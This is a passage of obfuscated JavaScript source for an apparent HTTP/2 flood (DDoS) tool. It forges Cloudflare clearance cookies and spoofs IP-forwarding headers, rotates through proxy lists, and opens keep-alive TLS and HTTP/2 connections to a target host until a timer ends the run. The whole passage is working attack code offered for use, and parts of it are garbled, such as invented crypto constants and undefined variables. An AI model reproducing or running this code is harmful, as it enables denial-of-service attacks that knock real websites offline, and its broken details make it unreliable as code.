headers['sec-fetch-mode'] = "navigate";
headers["sec-fetch-dest"] = "document";
headers["sec-fetch-user"] = '?1';
headers.cookie = ["cf_clearance=" + randstr(0x20) + '.' + randstr(0xa) + '-' + randstr(0xa) + '-1.0.1.1-' + randstr(0xb) + '_vs_V.' + randstr(0x15) + '_' + randstr(0x2f), "?__cf_chl_tk=" + randayat(0x2b) + '-' + randnombor(0xa) + "-0.0.1.1" + randnombor(0x4)];
headers["sec-fetch-site"] = "none";
headers['x-requested-with'] = "XMLHttpRequest";
headers['X-Cache'] = "HIT";
headers['server-timing'] = "pop;desc=KUL;dur=4,cache;desc=EDGE,hotness;desc=1,proto;desc=h3";
headers["Cache-Control"] = 'public,browser-ttl=0,sw-max-age=31536000,max-age=31529065';
headers.Via = spoofed;
headers.sss = spoofed;
headers["Sec-Websocket-Key"] = spoofed;
headers["Sec-Websocket-Version"] = 0xd;
headers.Upgrade = websocket;
headers["X-Forwarded-For"] = spoofed;
headers["X-Forwarded-Host"] = spoofed;
headers["Client-IP"] = spoofed;
headers["Real-IP"] = spoofed;
headers.Referer = randomReferer;
pathts;
headers["Referrer-Policy"] = ["Referrer-Policy"];
headers.Pragma = "akamai-x-cache-on, akamai-x-cache-remote-on, akamai-x-check-cacheable, akamai-x-get-cache-key, akamai-x-get-extracted-values, akamai-x-get-ssl-client-session-id, akamai-x-get-true-cache-key, akamai-x-serial-no, akamai-x-get-request-id,akamai-x-get-nonces,akamai-x-get-client-ip,akamai-x-feo-trace";
headers['x-frame-options'] = randomHeaders["x-frame-options"];
headers["x-xss-protection"] = randomHeaders["x-xss-protection"];
function runFlooder() {
  const _0x4547fe = proxies[Math.floor(Math.random() * (proxies.length - 0x0) + 0x0)];
  const _0x1f7c48 = _0x4547fe.split(':');
  headers.origin = 'https://' + parsedTarget.host;
  headers[":authority"] = parsedTarget.host;
  headers["user-agent"] = moz + az1 + uap1;
  const _0x50454d = {
    'host': _0x1f7c48[0x0],
    'port': ~~_0x1f7c48[0x1],
    'address': parsedTarget.host + ":443",
    'timeout': 0x64
  };
  Socker.HTTP(_0x50454d, (_0x9e698b, _0x19756f) => {
    if (_0x19756f) {
      return;
    }
    _0x9e698b.setKeepAlive(true, 0x927c0);
    const _0xe0f417 = {
      'host': parsedTarget.host,
      'port': 0x1bb,
      'secure': true,
      'challengesToSolve': Infinity,
      'resolveWithFullResponse': true,
      'followAllRedirects': true,
      'maxRedirects': 0xa,
      'clientTimeout': 0x1388,
      'clientlareMaxTimeout': 0x2710,
      'cloudflareTimeout': 0x1388,
      'cloudflareMaxTimeout': 0x7530,
      'honorCipherOrder': true,
      'ALPNProtocols': ['h2', "http/1.1", 'spdy/3.1', 'http/1.2', "http/2", "http/2+quic/43", 'http/2+quic/44'],
      'secureOptions': crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_NO_TICKET | crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3 | crypto.constants.SSL_OP_NO_COMPRESSION | crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION | crypto.constants.SSL_OP_TLSEXT_PADDING | crypto.constants.SSL_OP_ALL | crypto.constants.SSLcom | crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3 | crypto.constants.SSL_OP_NO_TLSv1 | crypto.constants.SSL_OP_NO_TLSv1_1 | crypto.constants.ALPN_ENABLED | crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION | crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE | crypto.constants.SSL_OP_LEGACY_SERVER_CONNECT | crypto.constants.SSL_OP_COOKIE_EXCHANGE | crypto.constants.SSL_OP_PKCS1_CHECK_1 | crypto.constants.SSL_OP_PKCS1_CHECK_2 | crypto.constants.SSL_OP_SINGLE_DH_USE | crypto.constants.SSL_OP_SINGLE_ECDH_USE | crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_NO_TICKET | crypto.constants.SSL_OP_NO_COMPRESSION | crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_TLSEXT_PADDING | crypto.constants.SSL_OP_ALL | crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION,
      'sigals': siga,
      'socket': _0x9e698b,
      'ciphers': tls.getCiphers().join(':') + cipper,
      'ecdhCurve': "prime256v1:X25519",
      'host': parsedTarget.host,
      'rejectUnauthorized': false,
      'servername': parsedTarget.host,
      'secureProtocol': ["TLS_method", 'TLSv1_1_method', "TLSv1_2_method", "TLSv1_3_method"],
      'sessionTimeout': 0x1388
    };
    const _0x3ae3b7 = tls.connect(0x1bb, parsedTarget.host, _0xe0f417);
    _0x3ae3b7.setKeepAlive(true, 0xea60);
    const _0x141f53 = http2.connect(parsedTarget.href, {
      'protocol': "https:",
      'settings': {
        'headerTableSize': 0x10000,
        'maxConcurrentStreams': 0x7d0,
        'initialWindowSize': 0xffff,
        'maxHeaderListSize': 0x10000,
        'enablePush': false
      },
      'maxSessionMemory': 0xfa00,
      'maxDeflateDynamicTableSize': 0xffffffff,
      'createConnection': () => _0x3ae3b7,
      'socket': _0x9e698b
    });
    _0x141f53.settings({
      'headerTableSize': 0x10000,
      'maxConcurrentStreams': 0x7d0,
      'initialWindowSize': 0x600000,
      'maxHeaderListSize': 0x10000,
      'enablePush': false
    });
    _0x141f53.on("connect", () => {});
    _0x141f53.on("close", () => {
      _0x141f53.destroy();
      _0x9e698b.destroy();
      return;
    });
    _0x141f53.on("error", _0x1a72fb => {
      _0x141f53.destroy();
      _0x9e698b.destroy();
      return;
    });
  });
}
const StopScript = () => process.exit(0x1);
setTimeout(StopScript, args.time * 0x3e8);
